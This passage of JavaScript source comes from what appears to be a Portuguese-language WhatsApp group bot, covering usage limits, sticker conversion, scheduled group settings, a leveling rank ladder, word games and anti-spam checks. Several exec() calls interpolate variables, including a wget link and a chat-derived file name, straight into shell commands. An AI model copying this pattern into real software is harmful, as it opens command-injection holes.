if (limitCounts <= 0) return conn.sendMessage(from,{text: `[👾] *LIMIT ESGOTADO*\n\n_Nota : para obter mais limit compre usando *${prefix}buylimit* ou suba de nível...`},{sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
conn.sendMessage(from, {text: jrpl.limitcount(limitCounts)}, { quoted : info})
found = true
}
}
if (found === false) {
let obj = { id: sender, limit: 0 }
_limit.push(obj)
fs.writeFileSync('./datab/grupos/limit.json', JSON.stringify(_limit))
conn.sendMessage(from, {text: jrpl.limitcount(limitCounts)}, { quoted : info})
}
} 
							
	//funtion limitado
const isLimit = (sender) =>{ 
if (issupre) {return false;}
let position = false
for (let i of _limit) {
if (i.id === sender) {
let limits = i.limit
if (limits >= limitawal ) {
position = true
conn.sendMessage(from, {text: jrpl.limitend(pushname)}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
return true
} else {
_limit
position = true
return false
}
}
}
if (position === false) {
const obj = { id: sender, limit: 0 }
_limit.push(obj)
fs.writeFileSync('./datab/grupos/limit.json',JSON.stringify(_limit))
return false
}
}
	
const sendFileFromUrl = async (from, url, caption, info, men) => {
let mime = ''; 
let res = await axios.head(url)
mime = res.headers['content-type'] 
if (mime.split("/")[1] === "gif") { 
return conn.sendMessage(from, {video: {url: url},
caption: caption, gifPlayback: true, 
mentions: men ? men : []}, {quoted: info}) 
}
 
let type = mime.split("/")[0]+"Message" 
if(mime === "application/pdf"){ 
return conn.sendMessage(from, {document: {url: url}, mimetype: 'application/pdf', 
caption: caption, mentions: men ? men : []}, {quoted: info}) 
} 

if(mime.split("/")[0] === "image"){ 
return conn.sendMessage(from, {image: {url: url}, caption: caption, mentions: men ? men : []}, {quoted: info}) 
}
if(mime.split("/")[0] === "video"){ 
return conn.sendMessage(from, {video: {url: url}, caption: caption, mentions: men ? men : []}, {quoted: info}) 
} 
if(mime.split("/")[0] === "audio"){ 
return conn.sendMessage(from, {audio: {url: url}, caption: caption, mentions: men ? men : [], mimetype: 'audio'}, {quoted: info}) 
}
}
	
const sendMediaURL = async(to, url, text ="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
conn.sendMessage(to, {type: media, mimetype: mime, caption: text, contextInfo: {"mentionedJid": mids}}, { quoted: info})
fs.unlinkSync(filename)
});
}   

/********** ANTI NOME MODIFICADO **********/
function isDoubleByte(str) {
for (let i = 0, n = str.length; i < n; i++) {
if (str.charCodeAt(i) > 255) {
return true;
}
}
return false;
}

const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 0) {
return "n/a"
}

const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}

return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}


const rply = async(texto) => {
conn.sendMessage(from, {text: texto}, {quoted: info})
}

if(botoes == false) {
var sendBtext = async (id, text1) => {
conn.sendMessage(id, {text: text1}, {quoted: selo})
}
} else {
// ENVIAR BOTÃO COM TEXTO
var sendBtext = async (id, text1, desc1, but = [], vr) => {
buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}
}

const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: info.key
}
} 
conn.sendMessage(idgp, reactionMessage
)}


if(botoes == false) {
var sendBimg = async (id, img1, text1) => {
conn.sendMessage(id, {image: {url: img1}, caption: text1}, {quoted: selo})
}
} else {
// ENVIAR BOTÃO COM IMAGEM
var sendBimg = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}
}

// ENVIAR MENU COM GIF OU QUALQUER DO TIPO
const sendGifButao = async (id, gif1, text1, desc1, but = [], vr) => {
buttonMessage = {
video: {url: gif1},
caption: text1,
gifPlayback: true, 
footerText: desc1,
buttons: but,
headerType: 4
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}

// PRA ENVIAR BOTÃO DE TEMPLATE

if(botoes == false) {
var sendBimgT = async (id, img1, text1) => {
conn.sendMessage(id, {image: {url: img1}, caption: text1}, {quoted: selo})
}
} else {
var sendBimgT = async (id, img1, text1, desc1, but = [], vr) => {

templateMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
templateButtons: but,
}
templateList = generateWAMessageFromContent(from, proto.Message.fromObject({ "templateMessage": templateMessage }), {quoted: vr});
conn.relayMessage(from, templateList.message, { messageId: templateList.key.id });
}
}

const sendlistA = async (id, txt1, txt2, title1, btext, but) => {

const sections = but

const listMessage = {
text: txt1,
footer: txt2,
title: title1,
buttonText: btext,
sections
}
conn.sendMessage(id, listMessage, {quoted: info})  
}

if(isGroup && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.key.fromMe) {
if(info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length || info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length - 1) { 
reply("Membro comum com mensagem de marcação de todos do grupo, por conta disso irei remover do grupo, qualquer coisa entre em contato com um administrador...")
conn.groupParticipantsUpdate(from, [sender], "remove")
}
}


const enviarfigu = async (figu, tag) => {
bla = fs.readFileSync(figu)
conn.sendMessage(from, {sticker: bla}, {quoted: info})
}

const enviarfiguUrl = async (link) => {
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buff = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buff}, {quoted: info}).catch(e => {
})
fs.unlinkSync(rano)
})
}

if(isAutofigu && isGroup) {
async function autofiguf() {
await setTimeout(async() => {    

if(budy.includes(`${prefix}sticker`) || budy.includes(`${prefix}s`) || budy.includes(`${prefix}stk`) || budy.includes(`${prefix}st`) || budy.includes(`${prefix}fsticker`) || budy.includes(`${prefix}f`) || budy.includes(`${prefix}fstiker`)) return

if(type === "videoMessage") {
if ((isMedia && info.message.videoMessage.seconds < 10)){  
rane = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
buffimg = await getFileBuffer(info.message.videoMessage, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'ale')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} 
}

if(type === "imageMessage") {
rane = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
buffimg = await getFileBuffer(info.message.imageMessage, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})  
}
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}

var nmrdnofc1 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")

if(isGroup && fs.existsSync(`./func/afk/afk-@${nmrdnofc1}.json`)) {
if(budy.includes(`@${nmrdnofc1}`)) {
const tabelin = JSON.parse(fs.readFileSync(`./func/afk/afk-@${nmrdnofc1}.json`));  

txt = `- Olá, o ${NickDono} Está ausente.\n\n - Desde: ${tabelin.Ausente_Desde}\n\n- 😇 Mensagem de ausência : ${tabelin.Motivo_Da_Ausência}`

conn.sendMessage(from, {text: txt}, {quoted: info})
}
}
 
if(isGroup && fs.existsSync(`./func/sairgp/sairgp-${from}.json`)) {

const sairalg = JSON.parse(fs.readFileSync(`./func/sairgp/sairgp-${from}.json`)); 

datinhaofc = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

if(datinhaofc == sairalg.Data_de_sair) {

group = await conn.groupMetadata(from)
member = group['participants']
mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
options = {
text: `Atenção membros, aqui quem está falando é o bot com a mensagem automática, sairei do grupo por o tempo que foi realizado no dia que alugou, completou 30 dias....`,
mentions: mem,
quoted: info
}
conn.sendMessage(from, options)

exec(`cd func && cd sairgp && rm sairgp-${from}.json`)

setTimeout(async() => {
reply(`${prefix}sairgp`)
}, 5000)
}
}

var blaaviso_ndms = `./func/avisos/aviso_${from}.json`

if(fs.existsSync(blaaviso_ndms)) {
async function avsofcbt() {
hora100 = moment.tz('America/Sao_Paulo').format('HH/mm/ss');
var avisos_gps = JSON.parse(fs.readFileSync(blaaviso_ndms))
if(hora100 === avisos_gps.hora) {
conn.sendMessage(from, {text: `${prefix}hidetag ${avisos_gps.texto}`})
}
}
myinterval = setInterval(avsofcbt, 1000)
await setTimeout(async () => {
clearInterval(myinterval);
}, 1000)
}
 
if(fs.existsSync("dados_store.json")) {
statsObj = fs.statSync('./dados_store.json')  

if(convertBytes(statsObj.size) >= "20 MB") {
exec("rm dados_store.json")
}
}
 
if(fs.existsSync(`./func/fgp-${from}.json`)) {
async function fgptotale() {
if(isGroup && fs.existsSync(`./func/fgp-${from}.json`)) {
 
var json_fgp = JSON.parse(fs.readFileSync(`./func/fgp-${from}.json`))
 
var hora_d_agr = moment.tz('America/Sao_Paulo').format('HH/mm/ss'); 

switch(hora_d_agr){
case json_fgp.abrirgp: {
await conn.groupSettingUpdate(from, 'not_announcement')
var blamsgfgp = `./func/horario-grupo-a-b/mensagem_de_abrir-fechar-${from}.json`
fs.writeFileSync(blamsgfgp, JSON.stringify("_- PROGRAMAÇÃO DE - _\n\nFECHAR / ABRIR GRUPO\n\n_- REALIZANDO AÇÃO _-", null, 2))
if(fs.existsSync(blamsgfgp)) { 
blarmsgfc = JSON.parse(fs.readFileSync(blamsgfgp))
}
await conn.sendMessage(from, {text: blarmsgfc})
fs.unlinkSync(blamsgfgp)
}
break

case json_fgp.fechargp: {
await conn.groupSettingUpdate(from, 'announcement')
var blamsgfgp = `./func/horario-grupo-a-b/mensagem_de_abrir-fechar-${from}.json`  
fs.writeFileSync(blamsgfgp, JSON.stringify("_- PROGRAMAÇÃO DE - _\n\nFECHAR / ABRIR GRUPO\n\n_- REALIZANDO AÇÃO _-", null, 2))
if(fs.existsSync(blamsgfgp)) { 
blarmsgfc = JSON.parse(fs.readFileSync(blamsgfgp))
}
await conn.sendMessage(from, {text: blarmsgfc})
fs.unlinkSync(blamsgfgp)
}
break

default:
}
} 
}

myinterval = setInterval(fgptotale, 1000)
await setTimeout(async () => {
clearInterval(myinterval);
}, 1000)
}

if(SoDono && budy.includes("reiniciar-ale") || info.key.fromMe && budy.includes("reiniciar-ale")) {
fs.writeFileSync("./cnt-upd.json",JSON.stringify([], null, 2))
console.log(banner3.string)   
console.log(banner2.string)  
console.log(color(
`CAUMA BRO TO INICIANDO`))
setTimeout(() => {
file = require.resolve(__filename)  
delete require.cache[file]
require(file)  
}, 500)
setTimeout(() => {
fs.unlinkSync("./cnt-upd.json")
}, 1500)
}

//========================================\\
//BAN CHATS/GRUPOS
if (isBanchat && !isGroupAdmins && !SoDono){
if (!isGroupAdmins && !SoDono) return
if (budy2.startsWith('unbangp')){
if (isCmd && !isBanchat && !isGroupAdmins) return reply(`Este grupo esta banido, ou seja não estou ouvindo ninguém`)
let lfd = bancht.indexOf(from)
bancht.splice(lfd, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
}
}
//=======FUNCIONALIDADE PATENTE=========\\
const nivelAtual = getLevelingLevel(sender)
var patt = 'Iniciante🔹I'
if (nivelAtual === 1) {
patt = 'Iniciante🔹I'
} else if (nivelAtual === 2) {
patt = 'Iniciante🔹II'
} else if (nivelAtual === 3) {
patt = 'Iniciante🔹III'
} else if (nivelAtual === 4) {
patt = 'Iniciante🔹IV'
} else if (nivelAtual === 5) {
patt = 'Iniciante🔹V'
} else if (nivelAtual === 6) {
patt = 'Aprendiz📕I'
} else if (nivelAtual === 7) {
patt = 'Aprendiz📕II'
} else if (nivelAtual === 8) {
patt = 'Aprendiz📕III'
} else if (nivelAtual === 9) {
patt = 'Aprendiz📕IV'
} else if (nivelAtual === 10) {
patt = 'Aprendiz📕V'
} else if (nivelAtual === 11) {
patt = 'Treinamento🔶I'
} else if (nivelAtual === 12) {
patt = 'Treinamento🔶II'
} else if (nivelAtual === 13) {
patt = 'Treinamento🔶III'
} else if (nivelAtual === 14) {
patt = 'Treinamento🔶IV'
} else if (nivelAtual === 15) {
patt = 'Treinamento🔶V'
} else if (nivelAtual === 16) {
patt = 'Formado💠I'
} else if (nivelAtual === 17) {
patt = 'Formado💠II'
} else if (nivelAtual === 18) {
patt = 'Formado💠III'
} else if (nivelAtual === 19) {
patt = 'Formado💠IV'
} else if (nivelAtual === 20) {
patt = 'Formado💠V'
} else if (nivelAtual === 21) {
patt = 'Platina🥏I'
} else if (nivelAtual === 22) {
patt = 'Platina🥏II'
} else if (nivelAtual === 23) {
patt = 'Platina🥏III'
} else if (nivelAtual === 24) {
patt = 'Platina🥏IV'
} else if (nivelAtual === 25) {
patt = 'Platina🥏V'
} else if (nivelAtual === 26) {
patt = 'Bronze🥉I'
} else if (nivelAtual === 27) {
patt = 'Bronze🥉II'
} else if (nivelAtual === 28) {
patt = 'Bronze🥉III'
} else if (nivelAtual === 29) {
patt = 'Bronze🥉IV'
} else if (nivelAtual === 30) {
patt = 'Bronze🥉V'
} else if (nivelAtual === 31) {
patt = 'Prata🥈I'
} else if (nivelAtual === 32) {
patt = 'Prata🥈II'
} else if (nivelAtual === 33) {
patt = 'Prata🥈III'
} else if (nivelAtual === 34) {
patt = 'Prata🥈IV'
} else if (nivelAtual === 35) {
patt = 'Prata🥈V'
} else if (nivelAtual === 36) {
patt = 'Ouro🥇I'
} else if (nivelAtual === 37) {
patt = 'Ouro🥇II'
} else if (nivelAtual === 38) {
patt = 'Ouro🥇III'
} else if (nivelAtual === 39) {
patt = 'Ouro🥇IV'
} else if (nivelAtual === 40) {
patt = 'Ouro🥇V'
} else if (nivelAtual === 41) {
patt = 'Diamante💎I'
} else if (nivelAtual === 42) {
patt = 'Diamante💎II'
} else if (nivelAtual === 43) {   	
patt = 'Diamante💎III'
} else if (nivelAtual === 44) {
patt = 'Diamante💎IV'
} else if (nivelAtual === 45) {
patt = 'Diamante💎V'
} else if (nivelAtual === 46) {
patt = '🔸️Mitico🔮l'
} else if (nivelAtual === 47) {
patt = '🔸️Mitico🔮Il'
} else if (nivelAtual === 48) {
patt = '🔸️Mitico🔮III'
} else if (nivelAtual === 49) {
patt = '🔸️Mitico🔮IV'
} else if (nivelAtual === 50) {
patt = '🔸️Mitico🔮V'
} else if (nivelAtual === 51) {
patt = 'Militar🪖l'
} else if (nivelAtual === 52) {
patt = 'Militar🪖ll'
} else if (nivelAtual === 53) {
patt = 'Militar🪖lll'
} else if (nivelAtual === 54) {
patt = 'Militar🪖lV'
} else if (nivelAtual === 55) {
patt = 'Militar🪖V'
} else if (nivelAtual === 56) {
patt = 'Reconhecimento⚔I'
} else if (nivelAtual === 57) {
patt = 'Reconhecimento⚔II'
} else if (nivelAtual === 58) {
patt = 'Reconhecimento⚔III'
} else if (nivelAtual === 59) {
patt = 'Reconhecimento⚔IV'
} else if (nivelAtual === 60) {
patt = 'Reconhecimento⚔V'
} else if (nivelAtual === 61) {
patt = 'Capitão🗡I'
} else if (nivelAtual === 62) {
patt = 'Capitão🗡II'
} else if (nivelAtual === 63) {
patt = 'Capitão🗡III'
} else if (nivelAtual === 64) {
patt = 'Capitão🗡IV'
} else if (nivelAtual === 65) {
patt = 'Capitão🗡V'
} else if (nivelAtual === 66) {
patt = 'Tenente🏅I'
} else if (nivelAtual === 67) {
patt = 'Tenente🏅II'
} else if (nivelAtual === 68) {
patt = 'Tenente🏅III'
} else if (nivelAtual === 69) {
patt = 'Tenente🏅IV'
} else if (nivelAtual === 70) {
patt = 'Tenente🏅V'
} else if (nivelAtual === 71) {
patt = '🔹️Desafiante🛡I'
} else if (nivelAtual === 72) {
patt = '🔹️Desafiante🛡II'
} else if (nivelAtual === 73) {
patt = '🔹️Desafiante🛡III'
} else if (nivelAtual === 74) {
patt = '🔹️Desafiante🛡IV'
} else if (nivelAtual === 75) {
patt = '🔹️Desafiante🛡V'
} else if (nivelAtual === 76) {
patt = 'Elfo🧝‍♂️🧝I'
} else if (nivelAtual === 77) {
patt = 'Elfo🧝‍♂️🧝II'
} else if (nivelAtual === 78) {
patt = 'Elfo🧝‍♂️🧝III'
} else if (nivelAtual === 79) {
patt = 'Elfo🧝‍♂️🧝IV'
} else if (nivelAtual === 80) {
patt = 'Elfo🧝‍♂️🧝V'
} else if (nivelAtual === 81) {
patt = 'Anão🧝I'
} else if (nivelAtual === 82) {
patt = 'Anão-agiota🧝II'
} else if (nivelAtual === 83) {
patt = 'Anão-militar🧝III'
} else if (nivelAtual === 84) {
patt = 'Anão-hacker🧝IV'
} else if (nivelAtual === 85) {
patt = 'Anão-flooder🧝V'
} else if (nivelAtual === 86) {
patt = 'Agiota🔫I'
} else if (nivelAtual === 87) {
patt = 'Agiota🔫II'
} else if (nivelAtual === 88) {
patt = 'Agiota🔫III'
} else if (nivelAtual === 89) {
patt = 'Agiota🔫IV'
} else if (nivelAtual === 90) {
patt = 'Agiota🔫V'
} else if (nivelAtual === 91) {
patt = 'Feiticeiro🧙‍♂️🧙‍♀️I'
} else if (nivelAtual === 92) {
patt = 'Feiticeiro🧙‍♂️🧙‍♀️II'
} else if (nivelAtual === 93) {
patt = 'Feiticeiro🧙‍♂️🧙‍♀️III'
} else if (nivelAtual === 94) {
patt = 'Feiticeiro🧙‍♂️🧙‍♀️IV'
} else if (nivelAtual === 95) {
patt = 'Feiticeiro🧙‍♂️🧙‍♀️V'
} else if (nivelAtual === 96) {
patt = '💯Lendário⭐I'
} else if (nivelAtual === 97) {
patt = '💯Lendário⭐II'
} else if (nivelAtual === 98) {
patt = '💯Lendário⭐III'
} else if (nivelAtual === 99) {
patt = '💯Lendário⭐IV'
} else if (nivelAtual === 100) {
patt = '💯Lendário⭐V'
} else if (nivelAtual === 101) {
patt = 'Grande_mestre🛐I'
} else if (nivelAtual === 102) {
patt = 'Grande_mestre🛐II'
} else if (nivelAtual === 103) {
patt = 'Grande_mestre🛐III'
} else if (nivelAtual === 104) {
patt = 'Grande_mestre🛐IV'
} else if (nivelAtual === 105) {
patt = 'Grande_mestre🛐V'
} else if (nivelAtual === 106) {
patt = 'Titan🌬I'
} else if (nivelAtual === 107) {
patt = 'Titan🌬II'
} else if (nivelAtual === 108) {
patt = 'Titan🌬III'
} else if (nivelAtual === 109) {
patt = 'Titan🌬IV'
} else if (nivelAtual === 110) {
patt = 'Titan🌬V'
} else if (nivelAtual === 111) {
patt = 'Rei_mago👑🧙‍♂️I'
} else if (nivelAtual === 112) {
patt = 'Rei_mago👑🧙‍♂️II'
} else if (nivelAtual === 113) {
patt = 'Rei_mago👑🧙‍♂️III'
} else if (nivelAtual === 114) {
patt = 'Rei_mago👑🧙‍♂️IV'
} else if (nivelAtual === 115) {
patt = 'Rei_mago👑🧙‍♂️V'
} else if (nivelAtual === 116) {
patt = 'Fênix 🪶I'
} else if (nivelAtual === 117) {
patt = 'Fênix 🪶II'
} else if (nivelAtual === 118) {
patt = 'Fênix 🪶III'
} else if (nivelAtual === 119) {
patt = 'Fênix 🪶IV'
} else if (nivelAtual === 120) {
patt = 'Fênix 🪶V'
} else if (nivelAtual === 121) {
patt = 'Dragon🐲I'
} else if (nivelAtual === 122) {
patt = 'Dragon🐲II'
} else if (nivelAtual === 123) {
patt = 'Dragon🐲III'
} else if (nivelAtual === 124) {
patt = 'Dragon🐲IV'
} else if (nivelAtual === 125) {
patt = 'Dragon🐲V'
} else if (nivelAtual === 126) {
patt = 'Colossal☁️I'
} else if (nivelAtual === 127) {
patt = 'Colossal☁️II'
} else if (nivelAtual === 128) {
patt = 'Colossal☁️III'
} else if (nivelAtual === 129) {
patt = 'Colossal☁️IV'
} else if (nivelAtual === 130) {
patt = 'Colossal☁️V'
} else if (nivelAtual === 131) {
patt = 'Range⚔I'
} else if (nivelAtual === 132) {
patt = 'Range⚔II'
} else if (nivelAtual === 133) {
patt = 'Range⚔III'
} else if (nivelAtual === 134) {
patt = 'Range⚔IV'
} else if (nivelAtual === 135) {
patt = 'Range⚔️V'
} else if (nivelAtual === 136) {
patt = 'Saiadin🧿I'
} else if (nivelAtual === 137) {
patt = 'Saiadin🧿II'
} else if (nivelAtual === 138) {
patt = 'Saiadin🧿III'
} else if (nivelAtual === 139) {
patt = 'Saiadin🧿IV'
} else if (nivelAtual === 140) {
patt = 'Saiadin🧿️V'
} else if (nivelAtual === 141) {
patt = 'WITER🦴I'
} else if (nivelAtual === 142) {
patt = 'WITER🦴II'
} else if (nivelAtual === 143) {
patt = 'WITER🦴III'
} else if (nivelAtual === 144) {
patt = 'WITER🦴IV'
} else if (nivelAtual === 145) {
patt = 'WITER🦴️V'
} else if (nivelAtual === 146) {
patt = '🔰Deus_sama🔰I'
} else if (nivelAtual === 147) {
patt = '🔰Deus_sama🔰II'
} else if (nivelAtual === 148) {
patt = '🔰Deus_sama🔰III'
} else if (nivelAtual === 149) {
patt = '🔰Deus_sama🔰IV'
} else if (nivelAtual >= 150) {
patt = '🔰Deus_sama🔰V'
}
//========================================\\


//==========(FUNÇÃO DE LEVEL)=============\\
if (isGroup && isLevelingOn && !info.key.fromMe) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(from, sender)
const amountXp = Math.floor(Math.random() * 10) + 500
const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
await reply(`
┏┉┉━═『✯✯✯✯✯』═━┉┉┓
       𖠌𝙻𝙴𝚅𝙴𝙻[𝗨𝗣]𖠌                              
  ⎊ 𝙽𝚞́𝚖𝚎𝚛𝚘: ${sender.split("@")[0]}
  ⎊ 𝚇ᴘ: ${getLevelingXp(sender)}
  ⎊ 𝙻ᴇᴠᴇʟ ${getLevel} -> ${getLevelingLevel(sender)}
  ⎊ 𝙿ᴀᴛᴇɴᴛᴇ ${patt}
┗┉┉━═『✯✯✯✯✯』═━┉┉┛`)
}
} catch (err) {
console.error(err)
}
}

//=======================================\\



const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
console.log('enviando sticker');
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
conn.sendMessage(to, {sticker: media}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}


//===================================\\

		//JOGO DO ANAGRAM
if(isGroup && fs.existsSync(`./armor/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./armor/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('está perto')
xp = Math.floor(Math.random() * 14) + 3000
if(budy.toUpperCase() == dataAnagrama.original) { conn.sendMessage(from, {text: `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./armor/anagrama-${from}.json`)		
addLevelingXp(sender, xp)
recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp*`
reply(recompensa)
		setTimeout(async() => {
fs.writeFileSync(`./armor/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./armor/anagrama-${from}.json`))
conn.sendMessage(from, {text:`
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────
`}) 
}, 5000)
}}

//========================================\\


		//JOGO QUIZ
if(isGroup && fs.existsSync(`./armor/quizanim-${from}.json`)){
let dataAnagramaa = JSON.parse(fs.readFileSync(`./armor/quizanim-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagramaa.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagramaa.original) return reply('está perto')
if(budy.toUpperCase() == dataAnagramaa.original) { 
conn.sendMessage(from,{text: `Parabéns ${pushname} você acertou\n${dataAnagramaa.original}\nProximo em 5 segundos...`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./armor/quizanim-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./armor/quizanim-${from}.json`, `${JSON.stringify(quizanimais[Math.floor(Math.random() * quizanimais.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./armor/quizanim-${from}.json`))
imagemtexto =`                             「❓Quiz❓」`
await conn.sendMessage(from, {image: {url: dataAnagrama2.foto}, caption: imagemtexto, thumbnail: wew}, {quoted: selo})
}, 5000)
}
}

const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
pratrp(nmrdn_dono2, botNumber, Luix1397)
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
             

///////////ANTI-SPAM BY ITALU/////////
if (isCmd && isFiltered(sender) && !isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff = `*「 ❗ 」Flood detectado, espere 5 segundos*`
return reply(ff)
}

if (isAntiLinkHard && isUrl(budy) && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM] - LINK', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${budy}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
return 
}

if (isCmd && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff1 = `*「 ❗ 」Flood detectado, espere 5 segundos*`
return reply(ff1)
}


//////BLOCK CMD///////
//(CREDITOS AO KAUAN GAY)\\
if(isGroup){
const checar = getComandos(from)
if(checar === undefined) addComandosId(from)
}
if(isGroup && isCmd && !SoDono && !isnit && getComandoBlock(from).includes(command))return reply('comando blockeado')

////FIMMMMMMMMM/////,


